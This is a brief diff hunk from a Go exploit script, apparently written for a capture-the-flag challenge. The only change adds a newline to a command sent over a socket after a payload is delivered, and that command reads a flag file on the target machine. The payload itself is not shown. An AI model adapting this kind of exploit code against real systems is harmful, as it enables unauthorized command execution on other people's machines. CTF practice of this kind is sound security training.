@@ -82,7 +82,7 @@ func main() {
     fmt.Println("[+] payload built:" + payload)
     conn.Write([]byte(payload))
     fmt.Println("[+] sending cmdline cmd")
-    conn.Write([]byte("cat /home/start/flag"))
+    conn.Write([]byte("cat /home/start/flag\n"))
     conn_reader(read_buffer)
     fmt.Println("[=] output:" + string(read_buffer))
 }
